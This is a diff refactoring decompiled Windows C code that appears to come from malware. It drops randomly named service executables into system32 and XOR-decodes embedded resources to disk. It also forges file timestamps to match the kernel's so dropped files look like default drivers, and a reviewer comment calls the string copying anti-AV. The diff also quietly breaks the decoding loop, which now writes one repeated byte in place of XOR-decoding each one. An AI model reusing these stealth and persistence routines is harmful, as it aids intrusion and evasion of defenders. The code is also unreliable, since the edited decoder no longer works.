@@ -325,6 +325,9 @@ void DeleteServiceExecutables()
 
 
 	exec_name = g_random_exec_name[0];
+
+	// I'm not a big fan of do-while loops instead of while loops
+	//	so this will likely be restructured soon.
 	do
 	{
 		strcpyW(exec_path, g_windows_directory, strlenW(g_windows_directory) * sizeof(WCHAR));
@@ -379,7 +382,7 @@ bool Is32Bit()
 	
 	if( RegQueryValueExW(hKey, L"PROCESSOR_ARCHITECTURE", 0, Data, &size) != ERROR_SUCCESS ) 
 	{
-		RegCloseKey(hKey);
+		RegCloseKey(hKey); // Should we not close the key later, too?
 		return false;
 	}
 	
@@ -392,7 +395,7 @@ bool Is32Bit()
 	return true;
 }
 
-BOOL IsLeapYear(signed int year)
+bool IsLeapYear(signed int year)
 {
 	bool v1; // zf@2
 
@@ -433,8 +436,6 @@ int GetDaysInMonth(signed int year, unsigned int month)
 
 bool WriteEncodedResource(LPCWSTR lpFileName, HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType, char *key, unsigned int key_len)
 {
-	char *v10; // eax@9
-	void *lpAddress; // [sp+8h] [bp-20h]@9
 	char *v16; // [sp+18h] [bp-10h]@10
 
 	HRSRC res = FindResourceW(hModule, lpName, lpType);
@@ -468,12 +469,11 @@ bool WriteEncodedResource(LPCWSTR lpFileName, HMODULE hModule, LPCWSTR lpName, L
 	
 	unsigned int i = 0;
 	unsigned int NumberOfBytesWritten = 0;
-	
-	char decoded_byte;
 
+	// Embedded loops, should be cleaned up further
 	while(i < res_size)
 	{
-		decoded_byte = res_content[i] ^ key[i % key_len];
+		char decoded_byte = res_content[i] ^ key[i % key_len];
 		WriteFile(hObject, &decoded_byte, 1, &NumberOfBytesWritten, 0);
 		++i;
 		
@@ -481,20 +481,20 @@ bool WriteEncodedResource(LPCWSTR lpFileName, HMODULE hModule, LPCWSTR lpName, L
 		{
 			if(i < res_size)
 			{
-				v10 = (char *)VirtualAlloc(NULL, res_size - i, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-				lpAddress = v10;
-				if(v10)
+				void *lpAddress = VirtualAlloc(NULL, res_size - i, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+				char *newFile = (char *)lpAddress;
+				if(newFile)
 				{
-					v16 = &v10[-i];
+					v16 = &newFile[-i];
 					
 					do
 					{
-						v16[i] = res_content[i] ^ key[i % key_len];
+						v16[i] = decoded_byte;
 						++i;
 					}
 					while(i < res_size);
 					
-					WriteFile(hObject, v10, res_size - 1024, &NumberOfBytesWritten, 0);
+					WriteFile(hObject, newFile, res_size - 1024, &NumberOfBytesWritten, 0);
 					VirtualFree(lpAddress, 0, MEM_RELEASE);
 				}
 			}
@@ -519,6 +519,7 @@ bool GetRandomServiceInfo(WCHAR *svc_name, WCHAR *svc_path)
 		strcpyW(&svc_name[strlenW(rnd_svc_name)], L".exe", 2 * strlenW(L".exe"));
 		svc_name[strlenW(rnd_svc_name) + strlenW(L".exe")] = 0;
 		
+		// This must be some anti-AV shit, it's done this way throughout the exec
 		strcpyW(svc_path, g_windows_directory, 2 * strlenW(g_windows_directory));
 		strcpyW(&svc_path[strlenW(g_windows_directory)], L"\\system32\\", 2 * strlenW(L"\\system32\\"));
 		strcpyW(&svc_path[strlenW(g_windows_directory) + strlenW(L"\\system32\\")], svc_name, 2 * strlenW(svc_name));
@@ -626,6 +627,7 @@ bool GeneralSetup()
 	return false;
 }
 
+// Why is this nessecery? Seems to be incredibly inefficient.
 bool IsFileAccessible(LPCWSTR lpFileName)
 {
 	PVOID oldValue = NULL;
@@ -633,18 +635,16 @@ bool IsFileAccessible(LPCWSTR lpFileName)
 	HANDLE file_handle = CreateFileW(lpFileName, GENERIC_READ, 1, 0, 3, FILE_FLAG_OPEN_NO_RECALL, 0);
 	_Wow64RevertWow64FsRedirection(oldValue);
 	
-	if(file_handle == INVALID_HANDLE_VALUE) return false;
+	if(file_handle == INVALID_HANDLE_VALUE) 
+		return false;
 	
 	CloseHandle(file_handle);
 	return true;
 }
 
+// Make the file seem as old as the windows default drivers
 bool SetReliableFileTime(LPCWSTR lpFileName)
-{
-	bool v1; // bl@1
-
-	v1 = 0;
-	
+{	
 	if(!g_kernel_creation_time.dwLowDateTime) return false;
 	if(!lpFileName) return false;
 	
@@ -656,8 +656,11 @@ bool SetReliableFileTime(LPCWSTR lpFileName)
 	if(file_handle == INVALID_HANDLE_VALUE) return false;
 	
 	if(SetFileTime(file_handle, &g_kernel_creation_time, &g_kernel_last_access_time, &g_kernel_last_write_time))
-		v1 = 1;
-	
+	{
+		CloseHandle(file_handle);
+		return true;
+	}
+
 	CloseHandle(file_handle);
-	return v1;
+	return false;
 }
